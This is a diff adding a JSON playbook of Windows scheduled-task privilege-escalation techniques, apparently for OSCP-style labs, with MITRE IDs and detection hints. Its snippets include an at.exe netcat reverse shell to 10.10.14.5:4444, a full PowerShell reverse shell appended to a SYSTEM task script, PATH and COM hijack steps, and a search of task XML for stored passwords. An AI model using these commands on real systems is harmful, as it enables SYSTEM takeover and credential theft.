@@ -1,0 +1,504 @@
+{
+  "phase": {
+    "id": "scheduled-tasks",
+    "title": "Scheduled Tasks",
+    "summary": "Hunt for SYSTEM-run scheduled tasks whose script, binary, or task XML you can modify.",
+    "icon": "calendar-clock"
+  },
+  "nodes": [
+    {
+      "id": "task-enum",
+      "parent_id": null,
+      "kind": "category",
+      "title": "Enumerate scheduled tasks",
+      "severity": "info",
+      "difficulty": "oscp-basic",
+      "summary": "List every task, its trigger, and its run-as account.",
+      "description_md": "Filter for non-Microsoft author and SYSTEM run-as to surface admin-set custom tasks.",
+      "mitre_attack_id": "T1053.005",
+      "tags": [
+        "enumeration",
+        "scheduled-tasks"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "schtasks /query",
+          "code": "schtasks /query /fo LIST /v"
+        },
+        {
+          "shell": "powershell",
+          "title": "Get-ScheduledTask",
+          "code": "Get-ScheduledTask | Where-Object { $_.Principal.UserId -eq 'SYSTEM' } | Select TaskName, TaskPath, Actions"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1053.005",
+          "url": "https://attack.mitre.org/techniques/T1053/005/",
+          "kind": "mitre"
+        }
+      ]
+    },
+    {
+      "id": "task-modifiable-script",
+      "parent_id": "task-enum",
+      "kind": "technique",
+      "title": "Writable script invoked by SYSTEM task",
+      "severity": "critical",
+      "difficulty": "oscp-basic",
+      "summary": "Tasks that call a .ps1 / .bat / .vbs in a writable directory are an easy SYSTEM win.",
+      "tags": [
+        "scheduled-tasks",
+        "script"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Check task action paths",
+          "code": "schtasks /query /fo LIST /v | findstr /i \"task to run\" | findstr /i \".bat .ps1 .vbs .cmd\""
+        },
+        {
+          "shell": "cmd",
+          "title": "Test write",
+          "code": "icacls \"C:\\Scripts\\maintenance.ps1\""
+        }
+      ],
+      "references": [],
+      "description_md": "Scheduled tasks running as SYSTEM that invoke a script file (`.ps1`, `.bat`, `.vbs`, `.cmd`) in a user-writable directory are among the most reliable OSCP findings. Since scripts are plain text, no binary compilation is required — append code, wait for the trigger.\n\n**Discovery workflow**:\n1. `schtasks /query /fo LIST /v | findstr /i \"Task To Run Run As\"` — list task actions and accounts\n2. Filter for SYSTEM-run tasks with script extensions in the action path\n3. `icacls \"<script_path>\"` — verify writability\n4. Append your payload (or overwrite entirely)\n5. Wait for the next scheduled trigger, or `schtasks /run /tn \"<taskname>\"` if allowed\n\n**Safe payload addition**: Append to the script (don't wipe it) to avoid breaking the task's intended function and alerting sysadmins. Use `Add-Content` / `echo ... >> file` rather than `Set-Content` / `echo ... > file`.",
+      "detection_hints": "Writes to script files referenced by SYSTEM scheduled tasks; Task Scheduler executing scripts modified outside of maintenance windows; file integrity monitoring alerts on task script directories."
+    },
+    {
+      "id": "task-modifiable-binary",
+      "parent_id": "task-enum",
+      "kind": "technique",
+      "title": "Writable binary invoked by SYSTEM task",
+      "severity": "critical",
+      "difficulty": "oscp-basic",
+      "summary": "Same as above but for .exe — overwrite, wait for trigger or force a run.",
+      "tags": [
+        "scheduled-tasks",
+        "binary"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Force a run",
+          "code": "schtasks /run /tn \"\\Custom\\MaintenanceTask\""
+        }
+      ],
+      "references": [],
+      "description_md": "When a scheduled task runs an executable (`.exe`) as SYSTEM and that binary is in a world-writable or user-writable directory, overwriting it with a payload provides code execution in the SYSTEM context on the next task trigger.\n\n**Compared to task-modifiable-script**: Binary replacement is more reliable (no interpreter or syntax issues) but noisier (file hash changes trigger FIM). Binary modifications also typically require stopping any running instances first.\n\n**Forcing execution**: If you have permission to manually trigger the task (`schtasks /run`), you don't need to wait for the schedule. If the task only runs as SYSTEM on a time-based trigger, either wait or try to manipulate the system clock (last resort).\n\n**Backup advice**: In exam/lab scenarios, always back up the original binary before replacement.",
+      "detection_hints": "Binary hash changes on task action executables; process creation from task-associated paths with unexpected parent (svchost.exe / taskeng.exe); EID 4688 for unexpected executables."
+    },
+    {
+      "id": "task-weak-acl",
+      "parent_id": "task-enum",
+      "kind": "technique",
+      "title": "Modifiable task XML in C:\\Windows\\System32\\Tasks",
+      "severity": "critical",
+      "difficulty": "oscp-advanced",
+      "summary": "Direct XML write lets you alter the run-as principal or command line.",
+      "tags": [
+        "scheduled-tasks",
+        "acl",
+        "xml"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Find writable XML tasks",
+          "code": "accesschk.exe /accepteula -uvw C:\\Windows\\System32\\Tasks"
+        }
+      ],
+      "references": [],
+      "description_md": "Scheduled task definitions are stored as XML files under `C:\\Windows\\System32\\Tasks\\` with a corresponding registry cache. If the XML file itself has a weak ACL granting write access to non-admin users, the attacker can directly modify the task definition — changing the action binary, adding arguments, or changing the run-as principal.\n\n**What to modify in the XML**:\n- `<Exec><Command>` — the binary or script to run\n- `<Arguments>` — command arguments\n- `<Principal><UserId>` — the account (if you want to change execution context)\n- `<Principal><RunLevel>` — set to `HighestAvailable` for elevated context\n\n**Trigger**: After modifying the XML, use `schtasks /run /tn <name>` or wait for the scheduled time. Note that the Task Scheduler service reads configuration from the registry cache and may need to be refreshed.\n\n**Accessing files**: Task XML files in `C:\\Windows\\System32\\Tasks` require admin rights by default — a weak ACL here is a genuine misconfiguration.",
+      "detection_hints": "Write events on files under `C:\\Windows\\System32\\Tasks\\`; Task Scheduler event 106 (task registered) or 200 (task started) for tasks with recently modified XML; EID 4657/Sysmon 13 on task registry cache."
+    },
+    {
+      "id": "task-at-legacy",
+      "parent_id": "task-enum",
+      "kind": "technique",
+      "title": "Legacy AT jobs (Win7 / 2008)",
+      "severity": "low",
+      "difficulty": "oscp-advanced",
+      "summary": "`at.exe` jobs on legacy boxes run as SYSTEM with no UAC.",
+      "tags": [
+        "scheduled-tasks",
+        "legacy"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Schedule",
+          "code": "at 16:00 \"C:\\Tools\\nc.exe -e cmd.exe 10.10.14.5 4444\""
+        }
+      ],
+      "references": [],
+      "description_md": "The legacy `at.exe` scheduler (pre-Windows Vista) creates jobs stored in `C:\\Windows\\System32\\At<n>.job`. On Windows 7 and Server 2008/2008 R2, `at.exe` jobs run in the SYSTEM context without requiring UAC consent or admin rights for creation.\n\n**Conditions**: This technique works on Windows 7 / Server 2008 R2 and older. It was patched/restricted in Windows 8 and later. The `Task Scheduler` service must be running.\n\n**Key difference from schtasks**: `at.exe` does NOT require administrator rights to schedule jobs on the legacy Task Scheduler interface — any user can submit AT jobs on older systems.\n\n**Usage**:\n```cmd\nat HH:MM \"C:\\Tools\\nc.exe -e cmd.exe 10.10.14.5 4444\"\n```\nSet the time to 1-2 minutes in the future, set up a listener, and receive a SYSTEM shell.\n\n**Enumeration**: `at` (no arguments) lists all scheduled AT jobs.",
+      "detection_hints": "at.exe execution from non-admin accounts; AT job file creation in System32; legacy scheduler events; absence of expected task in modern schtasks output (AT jobs don't show there)."
+    },
+    {
+      "id": "task-schtasks-query",
+      "kind": "technique",
+      "title": "Deep Task Enumeration via schtasks /query /v /fo LIST",
+      "summary": "Extract detailed scheduled task configuration including run-as user, action path, trigger, and last run status using verbose schtasks output.",
+      "severity": "info",
+      "parent_id": "task-enum",
+      "description_md": "The `schtasks /query /v /fo LIST` command reveals fields not visible in default output: Run As User, Task To Run (binary/script path), Status, Last Run Time, Next Run Time, and Schedule Type. This is the primary enumeration step before identifying writable task binaries or scripts.\n\nPipe through `findstr` to focus on high-value fields. PowerShell `Get-ScheduledTask` provides structured output for programmatic analysis.",
+      "difficulty": "oscp-basic",
+      "mitre_attack_id": "T1053.005",
+      "detection_hints": "Baseline task enumeration is low-signal. Alert on enumeration combined with subsequent writes to task binary/script paths or task XML modifications.",
+      "tags": [
+        "enumeration",
+        "schtasks",
+        "task-scheduler",
+        "recon"
+      ],
+      "prerequisites": [
+        "task-enum"
+      ],
+      "related": [
+        "task-modifiable-script",
+        "task-modifiable-binary"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Verbose task listing focused on key fields",
+          "code": "schtasks /query /v /fo LIST 2>nul | findstr /I \"TaskName Run As Task To Run Status Next Run\"\nschtasks /query /v /fo CSV | ConvertFrom-Csv | Select TaskName,\"Run As User\",\"Task To Run\",Status | Format-Table",
+          "description": "Enumerate all scheduled tasks with verbose detail and filter relevant fields.",
+          "requires_admin": false
+        },
+        {
+          "shell": "powershell",
+          "title": "PowerShell structured task enumeration",
+          "code": "Get-ScheduledTask | ForEach-Object {\n    $info = $_ | Get-ScheduledTaskInfo -ErrorAction SilentlyContinue\n    $principal = $_.Principal\n    $actions = $_.Actions | ForEach-Object { $_.Execute + ' ' + $_.Arguments }\n    [PSCustomObject]@{\n        Name      = $_.TaskName\n        Path      = $_.TaskPath\n        RunAs     = $principal.UserId\n        RunLevel  = $principal.RunLevel\n        Actions   = $actions -join '; '\n        LastRun   = $info.LastRunTime\n        LastResult= $info.LastTaskResult\n    }\n} | Where-Object { $_.RunAs -match 'SYSTEM|Administrator' } | Format-Table -AutoSize",
+          "description": "Enumerate all SYSTEM/admin tasks with their actions and last run result.",
+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE ATT&CK - Scheduled Task/Job: Scheduled Task",
+          "url": "https://attack.mitre.org/techniques/T1053/005/",
+          "kind": "mitre"
+        },
+        {
+          "title": "HackTricks - Scheduled Tasks Privilege Escalation",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#scheduled-tasks",
+          "kind": "hacktricks"
+        }
+      ]
+    },
+    {
+      "id": "task-writable-script-variant",
+      "kind": "technique",
+      "title": "Task Action Pointing to Writable Script (Variant)",
+      "summary": "Identify scheduled tasks that execute writable .ps1, .bat, .vbs, or .cmd scripts and modify script content to execute as the task's high-privilege account.",
+      "severity": "high",
+      "parent_id": "task-enum",
+      "description_md": "Distinct from `task-modifiable-script`: focuses on script-type actions (not binary actions) and covers the full range of script interpreters invoked by tasks (PowerShell, cmd, wscript, cscript). Attacker appends or replaces script content.\n\nCommon pattern: `powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\Maintenance.ps1` where `C:\\Scripts\\` is world-writable.",
+      "difficulty": "oscp-basic",
+      "mitre_attack_id": "T1053.005",
+      "detection_hints": "Monitor writes to script files referenced in task actions. Alert on Task Scheduler executing scripts modified outside of patch windows. File integrity monitoring on task script directories.",
+      "tags": [
+        "task-scheduler",
+        "script-hijack",
+        "powershell",
+        "bat",
+        "writable"
+      ],
+      "prerequisites": [
+        "task-enum",
+        "task-schtasks-query"
+      ],
+      "related": [
+        "task-modifiable-script",
+        "task-modifiable-binary"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Find tasks with writable script actions",
+          "code": "Get-ScheduledTask | ForEach-Object {\n    $task = $_\n    $_.Actions | Where-Object { $_.Execute -match 'powershell|cmd|wscript|cscript' } | ForEach-Object {\n        $scriptPath = $_.Arguments -replace '.*-[Ff]ile\\s+',''\n        $scriptPath = $scriptPath.Trim('\"').Split(' ')[0]\n        if ($scriptPath -and (Test-Path $scriptPath)) {\n            $acl = Get-Acl $scriptPath -ErrorAction SilentlyContinue\n            $acl.Access | Where-Object {\n                $_.FileSystemRights -match 'Write|FullControl' -and\n                $_.IdentityReference -notmatch 'SYSTEM|TrustedInstaller|Administrators'\n            } | ForEach-Object {\n                Write-Output \"TASK: $($task.TaskName) | SCRIPT: $scriptPath | ACE: $($_.IdentityReference)\"\n            }\n        }\n    }\n}",
+          "description": "Enumerate tasks that run scripts via interpreters and check for writable script files.",
+          "requires_admin": false
+        },
+        {
+          "shell": "powershell",
+          "title": "Append reverse shell to writable task script",
+          "code": "Add-Content -Path 'C:\\Scripts\\Maintenance.ps1' -Value \"`n`$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);`$stream = `$client.GetStream();[byte[]]`$bytes = 0..65535|%{0};while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0){`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0, `$i);`$sendback = (iex `$data 2>&1 | Out-String);`$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> ';`$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2);`$stream.Write(`$sendbyte,0,`$sendbyte.Length);`$stream.Flush()};`$client.Close()\"",
+          "description": "Append a PowerShell reverse shell to the writable task script.",
+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks - Scheduled Tasks Script Writable",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#scheduled-tasks",
+          "kind": "hacktricks"
+        },
+        {
+          "title": "MITRE ATT&CK - Scheduled Task/Job: Scheduled Task",
+          "url": "https://attack.mitre.org/techniques/T1053/005/",
+          "kind": "mitre"
+        }
+      ]
+    },
+    {
+      "id": "task-system-highest",
+      "kind": "technique",
+      "title": "Task Running as SYSTEM with Highest Privileges",
+      "summary": "Identify tasks configured with RunLevel Highest and principal SYSTEM, confirming full privilege context for exploitation via writable action target.",
+      "severity": "critical",
+      "parent_id": "task-enum",
+      "description_md": "Tasks with `<RunLevel>HighestAvailable</RunLevel>` or `<Principal><UserId>S-1-5-18</UserId></Principal>` run with the SYSTEM token at maximum integrity. These are highest-value targets: successfully modifying their action binary or script results in a SYSTEM shell.\n\nUse `schtasks /query /v` combined with `Get-ScheduledTask | Get-ScheduledTaskInfo` to correlate run level with executable paths.",
+      "difficulty": "oscp-basic",
+      "mitre_attack_id": "T1053.005",
+      "detection_hints": "Cross-reference SYSTEM tasks with filesystem ACLs on action targets. Any non-admin write to a SYSTEM task action target should be treated as critical.",
+      "tags": [
+        "task-scheduler",
+        "system",
+        "highest-privilege",
+        "escalation"
+      ],
+      "prerequisites": [
+        "task-enum",
+        "task-schtasks-query"
+      ],
+      "related": [
+        "task-modifiable-binary",
+        "task-weak-acl"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Find SYSTEM tasks with highest run level",
+          "code": "Get-ScheduledTask | Where-Object {\n    $_.Principal.UserId -match 'SYSTEM|S-1-5-18' -or\n    $_.Principal.RunLevel -eq 'Highest'\n} | ForEach-Object {\n    $actions = $_.Actions | ForEach-Object { $_.Execute + ' ' + $_.Arguments }\n    Write-Output \"Task: $($_.TaskName) | RunAs: $($_.Principal.UserId) | RunLevel: $($_.Principal.RunLevel)\"\n    Write-Output \"  Actions: $($actions -join '; ')\"\n}",
+          "description": "Identify all SYSTEM-context tasks and their action executables/scripts.",
+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE ATT&CK - Scheduled Task/Job: Scheduled Task",
+          "url": "https://attack.mitre.org/techniques/T1053/005/",
+          "kind": "mitre"
+        },
+        {
+          "title": "HackTricks - Scheduled Tasks",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#scheduled-tasks",
+          "kind": "hacktricks"
+        }
+      ]
+    },
+    {
+      "id": "task-env-var-injection",
+      "kind": "technique",
+      "title": "Environment Variable Injection in Task Action",
+      "summary": "Exploit scheduled task actions that reference environment variables (e.g., %APPDATA%, %PATH%) which can be manipulated in the user's environment context to redirect execution.",
+      "severity": "medium",
+      "parent_id": "task-enum",
+      "description_md": "Some tasks use environment variables in their action path: `%APPDATA%\\Company\\update.exe` or resolve executables from `%PATH%`. If the attacker controls the relevant environment variable (e.g., per-user `PATH` entries in `HKCU\\Environment`) or can write to a directory earlier in `%PATH%`, execution is redirected.\n\nParticularly effective for tasks that run under the current user's context with elevated rights (UAC auto-elevate tasks).",
+      "difficulty": "oscp-advanced",
+      "mitre_attack_id": "T1574.007",
+      "detection_hints": "Monitor `HKCU\\Environment` modifications, especially changes to PATH or custom variables. Alert on process creation where the executable path resolves to a user-writable directory.",
+      "tags": [
+        "task-scheduler",
+        "env-var",
+        "path-hijack",
+        "injection"
+      ],
+      "prerequisites": [
+        "task-enum",
+        "task-schtasks-query"
+      ],
+      "related": [
+        "task-modifiable-binary"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Find tasks using environment variables in actions",
+          "code": "Get-ScheduledTask | ForEach-Object {\n    $_.Actions | Where-Object { $_.Execute -match '%[A-Z]+%' -or $_.Arguments -match '%[A-Z]+%' } | ForEach-Object {\n        Write-Output \"Task: $($task.TaskName) | Action: $($_.Execute) $($_.Arguments)\"\n    }\n}",
+          "description": "Identify task actions referencing environment variables.",
+          "requires_admin": false
+        },
+        {
+          "shell": "cmd",
+          "title": "Manipulate per-user PATH to hijack resolution",
+          "code": "reg add \"HKCU\\Environment\" /v PATH /t REG_EXPAND_SZ /d \"C:\\Temp;%PATH%\" /f\nrem Place payload at C:\\Temp\\<taskbinary>.exe\ncopy C:\\Temp\\payload.exe C:\\Temp\\update.exe",
+          "description": "Prepend attacker-controlled directory to per-user PATH, then place payload matching the task's executable name.",
+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE ATT&CK - Path Interception by PATH Environment Variable",
+          "url": "https://attack.mitre.org/techniques/T1574/007/",
+          "kind": "mitre"
+        },
+        {
+          "title": "HackTricks - PATH DLL Hijacking",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dll-hijacking",
+          "kind": "hacktricks"
+        }
+      ]
+    },
+    {
+      "id": "task-com-handler",
+      "kind": "technique",
+      "title": "COM Handler Task Abuse",
+      "summary": "Hijack a COM object referenced by a scheduled task's COM handler action by planting a malicious COM server in HKCU, which takes precedence over HKLM registrations.",
+      "severity": "high",
+      "parent_id": "task-enum",
+      "description_md": "Some scheduled tasks use a `ComHandler` action instead of an executable, specifying a CLSID. Windows resolves COM objects by checking `HKCU\\Software\\Classes\\CLSID\\` before `HKLM`. A low-privilege user can register a malicious in-process or out-of-process COM server under HKCU to intercept the task's COM activation.\n\nIdentify COM handler tasks by parsing task XML: look for `<ComHandler>` elements. Research the CLSID in both hives to find unregistered or HKCU-overridable entries.",
+      "difficulty": "red-team",
+      "mitre_attack_id": "T1546.015",
+      "detection_hints": "Monitor HKCU COM registration (CLSID keys) for CLSIDs used by system tasks. Alert on DLL loads from user-writable paths within SYSTEM-context task processes.",
+      "tags": [
+        "task-scheduler",
+        "com",
+        "clsid",
+        "hkcu",
+        "hijack"
+      ],
+      "prerequisites": [
+        "task-enum",
+        "task-schtasks-query"
+      ],
+      "related": [
+        "svc-dll-hijack"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Extract COM handler CLSIDs from task XML",
+          "code": "$taskFolder = 'C:\\Windows\\System32\\Tasks'\nGet-ChildItem $taskFolder -Recurse -File | ForEach-Object {\n    $xml = [xml](Get-Content $_.FullName -ErrorAction SilentlyContinue)\n    $comHandlers = $xml.SelectNodes('//ComHandler')\n    if ($comHandlers.Count -gt 0) {\n        Write-Output \"Task: $($_.Name)\"\n        $comHandlers | ForEach-Object { Write-Output \"  CLSID: $($_.ClassId)\" }\n    }\n}",
+          "description": "Parse task XML files to find COM handler actions and extract their CLSIDs.",
+          "requires_admin": false
+        },
+        {
+          "shell": "powershell",
+          "title": "Register hijack COM server in HKCU",
+          "code": "$clsid = '{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}'\n$regPath = \"HKCU:\\Software\\Classes\\CLSID\\$clsid\\InProcServer32\"\nNew-Item -Path $regPath -Force | Out-Null\nSet-ItemProperty -Path $regPath -Name '(Default)' -Value 'C:\\Temp\\evil.dll'\nSet-ItemProperty -Path $regPath -Name 'ThreadingModel' -Value 'Apartment'",
+          "description": "Register a malicious DLL as the COM server for the target CLSID under HKCU.",
+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE ATT&CK - Event Triggered Execution: Component Object Model Hijacking",
+          "url": "https://attack.mitre.org/techniques/T1546/015/",
+          "kind": "mitre"
+        },
+        {
+          "title": "HackTricks - COM Hijacking",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#com-hijacking",
+          "kind": "hacktricks"
+        }
+      ]
+    },
+    {
+      "id": "task-ghost-registry",
+      "kind": "technique",
+      "title": "Ghost Task / Task Scheduler Registry Abuse",
+      "summary": "Create a 'ghost' scheduled task by writing directly to the Task Scheduler registry hive and task cache, bypassing the normal task registration process to hide from standard enumeration.",
+      "severity": "high",
+      "parent_id": "task-enum",
+      "description_md": "The Task Scheduler maintains task metadata in `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks` and `Tree`. By writing directly to these registry locations (requires admin or SeBackupPrivilege) and dropping a corresponding XML file in `C:\\Windows\\System32\\Tasks`, an attacker can create tasks invisible to `schtasks /query` but executed by the scheduler.\n\nUsed for persistence that survives standard enumeration. Requires crafted security descriptors to avoid visibility.",
+      "difficulty": "red-team",
+      "mitre_attack_id": "T1053.005",
+      "detection_hints": "Compare `schtasks /query` output against filesystem enumeration of `C:\\Windows\\System32\\Tasks` and registry keys under `TaskCache\\Tree`. Discrepancies indicate ghost tasks. Monitor direct registry writes to TaskCache.",
+      "tags": [
+        "task-scheduler",
+        "registry",
+        "ghost-task",
+        "persistence",
+        "evasion"
+      ],
+      "prerequisites": [
+        "task-enum"
+      ],
+      "related": [
+        "task-schtasks-query"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Detect ghost tasks (discrepancy check)",
+          "code": "$schedulerTasks = (schtasks /query /fo CSV /nh 2>$null | ConvertFrom-Csv -Header TaskName,NextRun,Status).TaskName\n$fsTasks = Get-ChildItem 'C:\\Windows\\System32\\Tasks' -Recurse -File | Select-Object -ExpandProperty Name\n$ghostCandidates = $fsTasks | Where-Object { $schedulerTasks -notcontains $_ }\nWrite-Output \"Potential ghost tasks: $($ghostCandidates -join ', ')\"",
+          "description": "Identify ghost tasks by comparing schtasks output against the filesystem task store.",
+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE ATT&CK - Scheduled Task/Job: Scheduled Task",
+          "url": "https://attack.mitre.org/techniques/T1053/005/",
+          "kind": "mitre"
+        },
+        {
+          "title": "Blog: Ghost Task Persistence Technique",
+          "url": "https://www.microsoft.com/en-us/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/",
+          "kind": "blog"
+        }
+      ]
+    },
+    {
+      "id": "task-xml-cred-export",
+      "kind": "technique",
+      "title": "Export Task XML to Extract Credentials",
+      "summary": "Export scheduled task definitions to XML using schtasks /query /xml or reading task files directly to recover plaintext or encoded credentials stored in task author/run-as fields.",
+      "severity": "medium",
+      "parent_id": "task-enum",
+      "description_md": "Tasks created with stored credentials (e.g., `schtasks /create /ru domain\\user /rp password`) embed those credentials in the task XML or the Task Scheduler credential store (LSA secrets / TaskCache). The XML representation via `schtasks /query /xml` may expose `<Author>` fields or argument strings containing credentials.\n\nAdditionally, tasks configured with `/rp *` prompt for creds that are stored in LSA. These can be extracted with tools like Mimikatz (`sekurlsa::logonpasswords`) if the task was recently run.",
+      "difficulty": "oscp-advanced",
+      "mitre_attack_id": "T1552.001",
+      "detection_hints": "Alert on bulk task XML exports by non-admin accounts. Monitor access to task files in `C:\\Windows\\System32\\Tasks` by non-system processes.",
+      "tags": [
+        "task-scheduler",
+        "credentials",
+        "xml",
+        "lsa",
+        "plaintext"
+      ],
+      "prerequisites": [
+        "task-enum",
+        "task-schtasks-query"
+      ],
+      "related": [
+        "task-system-highest"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Export all task XML and grep for credentials",
+          "code": "for /f \"tokens=1 delims=,\" %t in ('schtasks /query /fo CSV /nh') do (\n    schtasks /query /tn \"%t\" /xml ONE 2>nul >> C:\\Temp\\tasks_export.xml\n)\nfindstr /I \"password pass user author\" C:\\Temp\\tasks_export.xml",
+          "description": "Export all task XML definitions and search for credential-related strings.",
+          "requires_admin": false
+        },
+        {
+          "shell": "powershell",
+          "title": "Read task XML files directly from filesystem",
+          "code": "Get-ChildItem 'C:\\Windows\\System32\\Tasks' -Recurse -File | ForEach-Object {\n    $content = Get-Content $_.FullName -ErrorAction SilentlyContinue -Raw\n    if ($content -match 'password|passwd|credential|RunAs.*\\\\') {\n        Write-Output \"=== $($_.FullName) ===\"\n        $content | Select-String -Pattern 'password|passwd|credential' -CaseSensitive:$false\n    }\n}",
+          "description": "Search task XML files on disk for credential-related content.",
+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE ATT&CK - Credentials in Files",
+          "url": "https://attack.mitre.org/techniques/T1552/001/",
+          "kind": "mitre"
+        },
+        {
+          "title": "HackTricks - Scheduled Tasks Credentials",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#scheduled-tasks",
+          "kind": "hacktricks"
+        }
+      ]
+    }
+  ]
+}
